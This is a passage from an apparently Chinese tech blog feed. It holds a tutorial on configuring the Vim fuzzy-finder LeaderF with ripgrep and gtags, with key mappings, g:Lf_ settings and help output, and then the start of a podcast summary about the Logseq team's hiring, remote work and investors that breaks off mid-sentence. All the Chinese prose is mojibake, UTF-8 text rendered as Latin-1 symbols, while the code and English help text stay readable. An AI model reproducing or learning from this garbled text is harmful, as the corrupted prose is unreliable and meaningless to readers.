çš„æ­£åˆ™ä½¿ç”¨äº†ä¸€ä¸ªæ’ä»¶ <a href="https://github.com/othree/eregex.vim">https://github.com/othree/eregex.vim</a> ç°åœ¨è¿™ä¸ªæ’ä»¶ä¹Ÿä¸éœ€è¦äº†ã€‚</p><p>è¦åˆ©ç”¨ LeaderF è°ƒç”¨ rg å‘½ä»¤ï¼Œå¯ä»¥ä½¿ç”¨å‘½ä»¤è¡Œ <code>:Leaderf! rg</code>, ä¸ºäº†æ–¹ä¾¿ä½¿ç”¨ä½¿ç”¨ä¸‹é¢çš„å¿«æ·é”®æŸ¥è¯¢å…‰æ ‡æ‰€åœ¨ word</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">nmap &lt;leader&gt;frb &lt;Plug&gt;LeaderfRgCwordLiteralBoundary<br></code></pre></td></tr></table></figure><h3 id="è¿è¡Œ-LeaderF-ä¹‹åçš„æ“ä½œ"><a href="#è¿è¡Œ-LeaderF-ä¹‹åçš„æ“ä½œ" class="headerlink" title="è¿è¡Œ LeaderF ä¹‹åçš„æ“ä½œ"></a>è¿è¡Œ LeaderF ä¹‹åçš„æ“ä½œ</h3><p>åœ¨æ‰§è¡Œ Leaderf å‘½ä»¤å¼¹å‡ºçš„ç•Œé¢åï¼Œéœ€è¦ä½¿ç”¨ç‰¹å®šçš„å¿«æ·é”®è¿›è¡Œæ“ä½œï¼Œè¿™äº›å¿«æ·é”®å¯ä»¥ä½¿ç”¨ <code>help leaderf-prompt</code> è¿›è¡ŒæŸ¥çœ‹ã€‚</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs vim">Once LeaderF <span class="hljs-keyword">is</span> launched:                       *prompt* *leaderf-prompt*<br>    <span class="hljs-symbol">&lt;C-C&gt;</span>, <span class="hljs-symbol">&lt;ESC&gt;</span> : <span class="hljs-keyword">quit</span> from LeaderF.<br>    <span class="hljs-symbol">&lt;C-R&gt;</span> : switch between fuzzy <span class="hljs-built_in">search</span> <span class="hljs-keyword">mode</span> <span class="hljs-built_in">and</span> regex <span class="hljs-keyword">mode</span>.<br>    <span class="hljs-symbol">&lt;C-F&gt;</span> : switch between full path <span class="hljs-built_in">search</span> <span class="hljs-keyword">mode</span> <span class="hljs-built_in">and</span> name <span class="hljs-keyword">only</span> <span class="hljs-built_in">search</span> <span class="hljs-keyword">mode</span>.<br>    <span class="hljs-symbol">&lt;Tab&gt;</span> : switch <span class="hljs-keyword">to</span> <span class="hljs-keyword">normal</span> <span class="hljs-keyword">mode</span>.<br>    <span class="hljs-symbol">&lt;C-V&gt;</span>, <span class="hljs-symbol">&lt;S-Insert&gt;</span> : paste from clipboard.<br>    <span class="hljs-symbol">&lt;C-U&gt;</span> : clear the prompt.<br>    <span class="hljs-symbol">&lt;C-W&gt;</span> : <span class="hljs-keyword">delete</span> the word before the <span class="hljs-built_in">cursor</span> in the prompt.<br>    <span class="hljs-symbol">&lt;C-J&gt;</span>, <span class="hljs-symbol">&lt;C-K&gt;</span> : navigate the result <span class="hljs-keyword">list</span>.<br>    <span class="hljs-symbol">&lt;Up&gt;</span>, <span class="hljs-symbol">&lt;Down&gt;</span> : recall <span class="hljs-keyword">last</span>/<span class="hljs-keyword">next</span> <span class="hljs-built_in">input</span> pattern from <span class="hljs-keyword">history</span>.<br>    <span class="hljs-symbol">&lt;2-LeftMouse&gt;</span> <span class="hljs-built_in">or</span> <span class="hljs-symbol">&lt;CR&gt;</span> : <span class="hljs-keyword">open</span> the <span class="hljs-keyword">file</span> under <span class="hljs-built_in">cursor</span> <span class="hljs-built_in">or</span> selected(when<br>                            multiple <span class="hljs-keyword">files</span> are selected).<br>    <span class="hljs-symbol">&lt;C-X&gt;</span> : <span class="hljs-keyword">open</span> in horizontal <span class="hljs-keyword">split</span> window.<br>    &lt;C-]&gt; : <span class="hljs-keyword">open</span> in <span class="hljs-keyword">vertical</span> <span class="hljs-keyword">split</span> window.<br>    <span class="hljs-symbol">&lt;C-T&gt;</span> : <span class="hljs-keyword">open</span> in <span class="hljs-keyword">new</span> tabpage.<br>    <span class="hljs-symbol">&lt;F5&gt;</span>  : refresh the cache.<br>    <span class="hljs-symbol">&lt;C-LeftMouse&gt;</span> <span class="hljs-built_in">or</span> <span class="hljs-symbol">&lt;C-S&gt;</span> : select multiple <span class="hljs-keyword">files</span>.<br>    <span class="hljs-symbol">&lt;S-LeftMouse&gt;</span> : select consecutive multiple <span class="hljs-keyword">files</span>.<br>    <span class="hljs-symbol">&lt;C-A&gt;</span> : select <span class="hljs-keyword">all</span> <span class="hljs-keyword">files</span>.<br>    <span class="hljs-symbol">&lt;C-L&gt;</span> : clear <span class="hljs-keyword">all</span> selections.<br>    <span class="hljs-symbol">&lt;BS&gt;</span>  : <span class="hljs-keyword">delete</span> the preceding character in the prompt.<br>    <span class="hljs-symbol">&lt;Del&gt;</span> : <span class="hljs-keyword">delete</span> the current character in the prompt.<br>    <span class="hljs-symbol">&lt;Home&gt;</span>: <span class="hljs-keyword">move</span> the <span class="hljs-built_in">cursor</span> <span class="hljs-keyword">to</span> the begin of the prompt.<br>    <span class="hljs-symbol">&lt;End&gt;</span> : <span class="hljs-keyword">move</span> the <span class="hljs-built_in">cursor</span> <span class="hljs-keyword">to</span> the end of the prompt.<br>    <span class="hljs-symbol">&lt;Left&gt;</span>: <span class="hljs-keyword">move</span> the <span class="hljs-built_in">cursor</span> one character <span class="hljs-keyword">to</span> the <span class="hljs-keyword">left</span>.<br>    <span class="hljs-symbol">&lt;Right&gt;</span> : <span class="hljs-keyword">move</span> the <span class="hljs-built_in">cursor</span> one character <span class="hljs-keyword">to</span> the <span class="hljs-keyword">right</span>.<br>    <span class="hljs-symbol">&lt;C-P&gt;</span> : preview the result.<br>    <span class="hljs-symbol">&lt;C-Up&gt;</span> : scroll <span class="hljs-keyword">up</span> in the <span class="hljs-keyword">popup</span> preview window.<br>    <span class="hljs-symbol">&lt;C-Down&gt;</span> : scroll down in the <span class="hljs-keyword">popup</span> preview window.<br></code></pre></td></tr></table></figure><ul><li>tab : åˆ‡æ¢è¾“å…¥æ¨¡å¼å’Œ normal æ¨¡å¼ï¼Œè¿›å…¥ normal æ¨¡å¼åå¯ä»¥ä½¿ç”¨ <code>j</code> å’Œ <code>k</code> ä¸Šä¸‹ç§»åŠ¨å…‰æ ‡æ¥æŸ¥çœ‹æ–‡ä»¶ã€‚ </li><li>q :  normal æ¨¡å¼ä¸­ï¼Œé€€å‡º LeaderF</li></ul><p>åœ¨è¾“å…¥æ¨¡å¼ä¸‹ï¼Œå¯ä»¥ä½¿ç”¨ä¸‹é¢çš„å¿«æ·é”®è¿›è¡Œåˆ†å±æ˜¾ç¤ºã€‚</p><ul><li>ctrl + x : æ¨ªå‘åˆ†å‰²</li><li>ctrl + ] : ç«–å‘åˆ†å‰²</li><li>ctrl + T : tab åˆ†å‰²</li></ul><h2 id="â˜†-LeaderF-gtags-çš„é…ç½®"><a href="#â˜†-LeaderF-gtags-çš„é…ç½®" class="headerlink" title="â˜† LeaderF + gtags çš„é…ç½®"></a>â˜† LeaderF + gtags çš„é…ç½®</h2><p>gtags å’Œ LeaderF é…ç½®èµ·æ¥ä½¿ç”¨ï¼Œå®åœ¨æ˜¯å¾ˆä¸é”™ã€‚é¦–å…ˆè¦é…ç½®å¥½ gtagsï¼Œå…³äº global çš„å®‰è£…è¯¦è§ <a href="https://www.usmacd.com/cn/gtags-cscope/">GNU Global çš„ä½¿ç”¨</a>ï¼Œè¿™é‡Œå°±ä¸å†è¯¦ç»†è¯´äº†ï¼Œgtags çš„é…ç½®æ·»åŠ ä¸‹é¢ä¸¤è¡Œå³å¯ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">let $GTAGSLABEL=<span class="hljs-string">&#x27;native-pygments&#x27;</span><br>let $GTAGSCONF=<span class="hljs-string">&#x27;/usr/local/share/gtags/gtags.conf&#x27;</span><br></code></pre></td></tr></table></figure><p>é…ç½®å¥½ç³»ç»Ÿ gtagsï¼Œglobal ï¼Œgtags.conf çš„æ­£ç¡®è·¯å¾„ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">let g:Lf_Global = <span class="hljs-string">&#x27;/usr/local/bin/global&#x27;</span><br>let g:Lf_Gtags = <span class="hljs-string">&#x27;/usr/local/bin/gtags&#x27;</span><br>let g:Lf_Gtagsconf = <span class="hljs-string">&#x27;/usr/local/share/gtags/gtags.conf&#x27;</span><br>let g:Lf_Gtagslabel = <span class="hljs-string">&#x27;native-pygments&#x27;</span><br></code></pre></td></tr></table></figure><p>ä¸‹é¢ä¸¤è¡Œæ˜¯é…ç½®gtags è‡ªåŠ¨ç”Ÿæˆ tags æ–‡ä»¶ï¼Œä¸»è¦æ˜¯ä¸‰ä¸ªæ–‡ä»¶ <code>GPATH</code> , <code>GRTAGS</code>  <code>GTAGS</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">let g:Lf_GtagsSource = <span class="hljs-number">2</span><br>let g:Lf_GtagsAutoGenerate = <span class="hljs-number">1</span><br>let g:Lf_GtagsAutoUpdate = <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><ul><li>g:Lf_GtagsSource è®¾ç½® gtags çš„ç›®æ ‡æ–‡ä»¶ï¼Œè®¾ç½®ä¸º 2 é€šè¿‡æ‰§è¡Œå¤–éƒ¨å‘½ä»¤åˆ¤æ–­ç›®æ ‡æ–‡ä»¶ ï¼ˆä¾‹å¦‚ <code>git ls-files</code>ï¼‰</li><li>g:Lf_GtagsAutoGenerate  æ˜¯å¦è‡ªåŠ¨ç”Ÿæˆ tags æ–‡ä»¶ã€‚è®¾ç½®æˆ 1 å¹¶ä¸”åœ¨ g:Lf_RootMarkers å®šä¹‰çš„ç›®å½•ä¸­ï¼Œtags ä¼šè‡ªåŠ¨ç”Ÿæˆ</li><li>g:Lf_GtagsAutoUpdate æ˜¯å¦è‡ªåŠ¨æ›´æ–° tagsã€‚å¦‚æœè®¾ç½®æˆ 0 ï¼Œéœ€è¦å…ˆæ‰§è¡Œ <code>Leaderf gtags --update</code> æ‰‹åŠ¨æ›´æ–° tags æ–‡ä»¶</li></ul><p>tags æ–‡ä»¶ç”Ÿæˆçš„ç›®å½•å’Œ <code>g:Lf_CacheDirectory</code> çš„é…ç½®ç›¸å…³ï¼Œ g:Lf_CacheDirectory ç”¨äºè®¾ç½®ç¼“å­˜æ–‡ä»¶ç›®å½•ï¼Œé»˜è®¤çš„ç›®å½•æ˜¯ $HOME (Windows ä¸Šä¼šæœ‰å˜åŒ–)ä½¿ç”¨ <code>_</code> æ›¿æ¢äº† <code>/</code> ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ls</span> ~/.LfCache/gtags/_home_henices_.vim <br>GPATH  GRTAGS  GTAGS<br></code></pre></td></tr></table></figure><p>æ–°ç‰ˆæœ¬çš„ LeaderFï¼Œg:Lf_CacheDirectory çš„é»˜è®¤å€¼å‘ç”Ÿäº†å˜åŒ–ï¼ŒLinux ç³»ç»Ÿä¸€èˆ¬ä¸º <code>~/.cache/LeaderF</code>ï¼Œè¯¦æƒ…å¦‚ä¸‹ï¼š</p><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs vbnet"><span class="hljs-symbol">g:</span>Lf_CacheDirectory                              *g:Lf_CacheDirectory*<br>    <span class="hljs-keyword">Set</span> this <span class="hljs-keyword">option</span> <span class="hljs-keyword">to</span> change the location <span class="hljs-keyword">of</span> the cache directory.<br>    e.g. &gt;<br>    <span class="hljs-keyword">let</span> g:Lf_CacheDirectory = <span class="hljs-comment">&#x27;/root&#x27;</span><br>&lt;<br>    <span class="hljs-keyword">On</span> Windows, <span class="hljs-keyword">default</span> value <span class="hljs-built_in">is</span> <span class="hljs-comment">&#x27;%APPDATA%&#x27;.</span><br>    <span class="hljs-keyword">On</span> Linux, <span class="hljs-keyword">default</span> value <span class="hljs-built_in">is</span> <span class="hljs-comment">&#x27;$XDG_CACHE_HOME&#x27; if $XDG_CACHE_HOME is defined,</span><br>    otherwise, <span class="hljs-keyword">default</span> value <span class="hljs-built_in">is</span> <span class="hljs-comment">&#x27;$HOME/.cache&#x27;.</span><br></code></pre></td></tr></table></figure><p>å®Œæˆäº†ä¸Šé¢çš„é…ç½®åï¼Œæˆ‘ä»¬å°±å¯ä»¥æ­£å¸¸ä½¿ç”¨ LeaderF æ¥å¯¹ gtags ç”Ÿæˆçš„ tags æ–‡ä»¶è¿›è¡Œæµè§ˆäº†ï¼Œåœ¨å‘½ä»¤è¡Œä½¿ç”¨ <code>:Leaderf gtags -h</code> å¯ä»¥çœ‹åˆ°è¯¦ç»†çš„å‘½ä»¤ã€‚</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs prolog">:<span class="hljs-symbol">Leaderf</span> gtags -h<br>usage:<br><span class="hljs-symbol">Leaderf</span>[!] gtags [-h] [--remove] [--recall]<br><span class="hljs-symbol">Leaderf</span>[!] gtags --update [--gtagsconf &lt;<span class="hljs-symbol">FILE</span>&gt;] [--gtagslabel &lt;<span class="hljs-symbol">LABEL</span>&gt;] [--accept-dotfiles]<br>                 [--skip-unreadable] [--skip-symlink [&lt;<span class="hljs-symbol">TYPE</span>&gt;]] [--gtagslibpath &lt;<span class="hljs-symbol">PATH</span>&gt; [&lt;<span class="hljs-symbol">PATH</span>&gt; ...]]<br><span class="hljs-symbol">Leaderf</span>[!] gtags [--current-buffer | --all-buffers | --all] [--result &lt;<span class="hljs-symbol">FORMAT</span>&gt;] [<span class="hljs-symbol">COMMON_OPTIONS</span>]<br><span class="hljs-symbol">Leaderf</span>[!] gtags -d &lt;<span class="hljs-symbol">PATTERN</span>&gt; [--auto-jump [&lt;<span class="hljs-symbol">TYPE</span>&gt;]] [-i] [--literal] [--path-style &lt;<span class="hljs-symbol">FORMAT</span>&gt;] [-<span class="hljs-symbol">S</span> &lt;<span class="hljs-symbol">DIR</span>&gt;]<br>                 [--append] [--match-path] [--gtagsconf &lt;<span class="hljs-symbol">FILE</span>&gt;] [--gtagslabel &lt;<span class="hljs-symbol">LABEL</span>&gt;] [<span class="hljs-symbol">COMMON_OPTIONS</span>]<br><span class="hljs-symbol">Leaderf</span>[!] gtags -r &lt;<span class="hljs-symbol">PATTERN</span>&gt; [--auto-jump [&lt;<span class="hljs-symbol">TYPE</span>&gt;]] [-i] [--literal] [--path-style &lt;<span class="hljs-symbol">FORMAT</span>&gt;] [-<span class="hljs-symbol">S</span> &lt;<span class="hljs-symbol">DIR</span>&gt;]<br>                 [--append] [--match-path] [--gtagsconf &lt;<span class="hljs-symbol">FILE</span>&gt;] [--gtagslabel &lt;<span class="hljs-symbol">LABEL</span>&gt;] [<span class="hljs-symbol">COMMON_OPTIONS</span>]<br><span class="hljs-symbol">Leaderf</span>[!] gtags -s &lt;<span class="hljs-symbol">PATTERN</span>&gt; [-i] [--literal] [--path-style &lt;<span class="hljs-symbol">FORMAT</span>&gt;] [-<span class="hljs-symbol">S</span> &lt;<span class="hljs-symbol">DIR</span>&gt;] [--append]<br>                 [--match-path] [--gtagsconf &lt;<span class="hljs-symbol">FILE</span>&gt;] [--gtagslabel &lt;<span class="hljs-symbol">LABEL</span>&gt;] [<span class="hljs-symbol">COMMON_OPTIONS</span>]<br><span class="hljs-symbol">Leaderf</span>[!] gtags -g &lt;<span class="hljs-symbol">PATTERN</span>&gt; [-i] [--literal] [--path-style &lt;<span class="hljs-symbol">FORMAT</span>&gt;] [-<span class="hljs-symbol">S</span> &lt;<span class="hljs-symbol">DIR</span>&gt;] [--append]<br>                 [--match-path] [--gtagsconf &lt;<span class="hljs-symbol">FILE</span>&gt;] [--gtagslabel &lt;<span class="hljs-symbol">LABEL</span>&gt;] [<span class="hljs-symbol">COMMON_OPTIONS</span>]<br><span class="hljs-symbol">Leaderf</span>[!] gtags --by-context [--auto-jump [&lt;<span class="hljs-symbol">TYPE</span>&gt;]] [-i] [--literal] [--path-style &lt;<span class="hljs-symbol">FORMAT</span>&gt;] [-<span class="hljs-symbol">S</span> &lt;<span class="hljs-symbol">DIR</span>&gt;]<br>                 [--append] [--match-path] [--gtagsconf &lt;<span class="hljs-symbol">FILE</span>&gt;] [--gtagslabel &lt;<span class="hljs-symbol">LABEL</span>&gt;] [<span class="hljs-symbol">COMMON_OPTIONS</span>]<br>[<span class="hljs-symbol">COMMON_OPTIONS</span>]: [--reverse] [--stayOpen] [--input &lt;<span class="hljs-symbol">INPUT</span>&gt; | --cword]<br>                  [--top | --bottom | --left | --right | --belowright | --aboveleft | --fullScreen]<br>                  [--nameOnly | --fullPath | --fuzzy | --regexMode] [--nowrap] [--next | --previous]<br><br>...<br></code></pre></td></tr></table></figure><p>LeaderF gtags æœ€å¸¸ç”¨çš„ <code>:Leaderf[!] gtags -d/-r/-s/-g</code>ï¼Œ å…·ä½“çš„ä½œç”¨å¦‚ä¸‹æ‰€ç¤ºï¼Œ<code>!</code> è¡¨ç¤ºç›´æ¥è¿›å…¥ normal æ¨¡å¼ã€‚</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs vim">--gtagslibpath <span class="hljs-symbol">&lt;PATH&gt;</span> [<span class="hljs-symbol">&lt;PATH&gt;</span> ...]<br>                      Specify the paths <span class="hljs-keyword">to</span> <span class="hljs-built_in">search</span> <span class="hljs-keyword">for</span> library functions.<br>-d <span class="hljs-symbol">&lt;PATTERN&gt;</span>, --definition <span class="hljs-symbol">&lt;PATTERN&gt;</span><br>                      Show locations of definitions.<br>-r <span class="hljs-symbol">&lt;PATTERN&gt;</span>, --reference <span class="hljs-symbol">&lt;PATTERN&gt;</span><br>                      Show reference <span class="hljs-keyword">to</span> <span class="hljs-keyword">a</span> symbol which <span class="hljs-built_in">has</span> definitions.<br>-s <span class="hljs-symbol">&lt;PATTERN&gt;</span>, --symbol <span class="hljs-symbol">&lt;PATTERN&gt;</span><br>                      Show reference <span class="hljs-keyword">to</span> <span class="hljs-keyword">a</span> symbol which <span class="hljs-built_in">has</span> <span class="hljs-keyword">no</span> definition.<br>-g <span class="hljs-symbol">&lt;PATTERN&gt;</span>, --<span class="hljs-keyword">grep</span> <span class="hljs-symbol">&lt;PATTERN&gt;</span><br></code></pre></td></tr></table></figure><p>æ—¥å¸¸ä½¿ç”¨ä¸­ï¼ŒåŒæ ·å¯ä»¥é…ç½®å¿«æ·é”®æ–¹ä¾¿ä½¿ç”¨ï¼Œä¸‹é¢çš„å¿«æ·é”®å°†å¯¹å…‰æ ‡æ‰€åœ¨å•è¯è¿›è¡Œ tag æŸ¥æ‰¾ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">nmap &lt;leader&gt;fgd &lt;Plug&gt;LeaderfGtagsDefinition<br>nmap &lt;leader&gt;fgr &lt;Plug&gt;LeaderfGtagsReference<br>nmap &lt;leader&gt;fgs &lt;Plug&gt;LeaderfGtagsSymbol<br>nmap &lt;leader&gt;fgg &lt;Plug&gt;LeaderfGtagsGrep<br></code></pre></td></tr></table></figure><h3 id="è¿è¡Œ-LeaderF-gtags-ä¹‹å"><a href="#è¿è¡Œ-LeaderF-gtags-ä¹‹å" class="headerlink" title="è¿è¡Œ LeaderF gtags ä¹‹å"></a>è¿è¡Œ LeaderF gtags ä¹‹å</h3><p>ä½¿ç”¨ LeaderF + gtags è·³è½¬åˆ°æºç åï¼Œå¦‚æœæƒ³ç»§ç»­è·³è½¬åˆ°ä¸‹ä¸€ä¸ªæˆ–è€…ä¸Šä¸€ä¸ª tag å¯ä»¥ä½¿ç”¨ <code>Leaderf gtags --next</code> å’Œ <code>Leaderf gtags --previous</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><br>noremap &lt;leader&gt;fgn :&lt;C-U&gt;&lt;C-R&gt;=<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Leaderf gtags --next %s&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)&lt;CR&gt;&lt;CR&gt;<br>noremap &lt;leader&gt;fgp :&lt;C-U&gt;&lt;C-R&gt;=<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Leaderf gtags --previous %s&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)&lt;CR&gt;&lt;CR&gt;<br></code></pre></td></tr></table></figure><h2 id="â˜†-LeaderF-çš„å…¶ä»–ç”¨æ³•"><a href="#â˜†-LeaderF-çš„å…¶ä»–ç”¨æ³•" class="headerlink" title="â˜† LeaderF çš„å…¶ä»–ç”¨æ³•"></a>â˜† LeaderF çš„å…¶ä»–ç”¨æ³•</h2><p>LeaderF è¿˜å¯ä»¥å’Œ <a href="https://github.com/ludovicchabant/vim-gutentags">Gutentags</a> é…åˆä½¿ç”¨è¿›è¡Œæºç æµè§ˆï¼Œä½†å·²ç»è¶…å‡ºæœ¬æ–‡å†…å®¹ï¼Œæœ‰å…´è¶£è€…å¯ä»¥æŸ¥é˜…ç½‘ç»œä¸Šçš„å…¶ä»–èµ„æ–™ã€‚</p><h2 id="â˜†-å‚è€ƒèµ„æ–™"><a href="#â˜†-å‚è€ƒèµ„æ–™" class="headerlink" title="â˜† å‚è€ƒèµ„æ–™"></a>â˜† å‚è€ƒèµ„æ–™</h2><p><a href="https://github.com/Yggdroot/LeaderF/blob/master/doc/leaderf.txt">https://github.com/Yggdroot/LeaderF/blob/master/doc/leaderf.txt</a><br><a href="https://retzzz.github.io/dc9af5aa/">https://retzzz.github.io/dc9af5aa/</a><br><a href="https://github.com/Yggdroot/LeaderF/blob/master/README.md">https://github.com/Yggdroot/LeaderF/blob/master/README.md</a><br><a href="https://zhuanlan.zhihu.com/p/36279445">https://zhuanlan.zhihu.com/p/36279445</a><br><a href="https://github.com/vim/vim/blob/master/runtime/doc/popup.txt">https://github.com/vim/vim/blob/master/runtime/doc/popup.txt</a><br><a href="https://neovim.io/doc/user/api.html#api-floatwin">https://neovim.io/doc/user/api.html#api-floatwin</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>Programming</tag>
      
      <tag>vim</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>å¯¹è¯logseqè”åˆåˆ›å§‹äººï¼Œçœ‹ç¡…è°·å¤§ä½¬çš„ä¼ å¥‡æŠ•èµ„ æ€»ç»“</title>
    <link href="/cn/logseq_interview/"/>
    <url>/cn/logseq_interview/</url>
    
    <content type="html"><![CDATA[<p><a href="https://pca.st/x398eeq0">https://pca.st/x398eeq0</a></p><ol><li>æŠ€æœ¯æ‹›è˜æ—¶ï¼Œæœ‰ side project çš„ä¼˜å…ˆï¼Œè®¤ä¸ºæœ‰ side project çš„æŠ€æœ¯äººå‘˜å¤§å¤šæœ‰è‡ªå·±ç‹¬ç‰¹çš„æƒ³æ³•ï¼Œè‡ªé©±åŠ›ä¹Ÿè¾ƒå¼ºã€‚</li><li>å¼ºè°ƒæŠ€æœ¯çƒ­æƒ…å’Œå­¦ä¹ èƒ½åŠ›ï¼Œå°ä¼—è¯­è¨€ä¼šçš„äººä¸å¤šï¼Œä½†æ˜¯è¯­è¨€ä¸æ˜¯ä¸»è¦é—®é¢˜ã€‚å¯¹äºå¯¹æ–°æŠ€æœ¯å……æ»¡çƒ­æƒ…å’Œå¥½å¥‡å¿ƒçš„æŠ€æœ¯äººæ¥è¯´å­¦ä¹ å°±å¯ä»¥äº†ã€‚</li><li>è‡ªç”±å¼€æ”¾çš„å›¢é˜Ÿæ–‡åŒ–ï¼Œå¤§éƒ½æ˜¯æŠ€æœ¯äººå‘˜ï¼Œç›¸äº’ä¹‹é—´æ¯”è¾ƒå¹³ç­‰ï¼Œå’Œç¤¾åŒºæ²Ÿé€šäº¤æµç´§å¯†ã€‚æ²¡æœ‰æ˜ç¡®çš„ deadlineï¼Œä½†å¤§å®¶éƒ½æ¯”è¾ƒåŠªåŠ›ï¼Œå·¥ä½œä»»åŠ¡åˆ†é…ä»¥å…´è¶£è‡ªé¢†ä¸ºä¸»æŒ‡æ´¾ä¸ºè¾…ã€‚</li><li>æ²¡æœ‰å¤ªå¤šçš„è¥é”€ï¼Œäº§å“å®šä½å’Œè·¯çº¿ä¹Ÿæ˜¯é€æ¸æ˜ç¡®ï¼Œæœ€å¼€å§‹æ˜¯ä»ç§¦å¤©ç”Ÿçš„ä¸€ä¸ª side project æ…¢æ…¢å‘å±•èµ·æ¥ã€‚ä¹Ÿæ²¡æœ‰å®šé‡åˆ†æè¿‡äº§å“ç”¨æˆ·çˆ†ç‚¸æ€§å¢é•¿çš„åŸå› ï¼Œåªæœ‰æ¨¡ç³Šçš„æ„Ÿè§‰ï¼ŒLogseq å†…ç½® PDF é˜…è¯»å’Œæ ‡æ³¨æ„Ÿè§‰æ˜¯ä¸€ä¸ªçªç ´ç‚¹ã€‚</li><li>Logseq å›¢é˜Ÿå…³äºè¿œç¨‹å·¥ä½œçš„ä¸€äº›å®è·µï¼Œå¿—è¿œè®¤ä¸ºåœ¨ä¸€ä¸ªå›½é™…å›¢é˜Ÿä¸­è¿œç¨‹å·¥ä½œéœ€è¦å…‹æœæ—¶å·®é—®é¢˜ï¼Œéœ€è¦è®¨è®ºé—®é¢˜çš„æ—¶å€™æ¯”è¾ƒéº»çƒ¦ã€‚è§£å†³çš„æ–¹å¼æ˜¯å†™æ¯”è¾ƒè¯¦ç»†çš„ issue å¤ç°æ–‡æ¡£ï¼ŒåŸºæœ¬æ˜¯ step by step çš„ã€‚è®¨è®ºæƒ³æ³•å¤šå½•åˆ¶ä¸€äº›æ¼”ç¤ºè§†é¢‘ï¼Œæœ‰é—®é¢˜å°±ç›´æ¥ç»™å¯¹æ–¹å‘æ¶ˆæ¯ä¸èƒ½é©¬ä¸Šå›å¤ä¹Ÿé—®é¢˜ä¸å¤§ï¼Œå¾ˆå¤šäº‹æƒ…æ²¡æœ‰æƒ³è±¡ä¸­çš„é‡è¦ã€‚</li><li>Logseq å›¢é˜Ÿåä½œçš„ä¸»è¦å·¥å…·ï¼Œä»£ç é—®é¢˜å’Œ issue ç®¡ç†ä½¿ç”¨ Githubï¼Œé—®é¢˜è®¨è®ºä½¿ç”¨ Discord + è®ºå› ï¼ˆDiscord å¤„ç†å³æ—¶åé¦ˆï¼Œè®ºå›ä¸»è¦ç”¨æ¥è¾ƒé•¿æ—¶é—´çš„è®¨è®ºï¼‰ï¼Œ å›¢é˜Ÿå†…éƒ¨çš„é€šè®¯å·¥å…·ä½¿ç”¨ Slackã€‚</li></ol><p>Logseq çš„æŠ•èµ„äººéå¸¸è±ªå,æˆ‘æŸ¥äº†ä¸€ä¸‹æœ‰ Stripe é¦–å¸­æ‰§è¡Œå®˜ Patrick Collisonã€GitHub å‰é¦–å¸­æ‰§è¡Œå®˜ Nat Friedmanã€Shopify åˆ›å§‹äºº Tobias LÃ¼tkeã€A16Z æ€»ç»ç† Sriram Krishnanç­‰äººï¼Œæ›´ç¥å¥‡çš„æ˜¯ä»–ä»¬å¤§å¤šä¹Ÿæ˜¯ Logseq 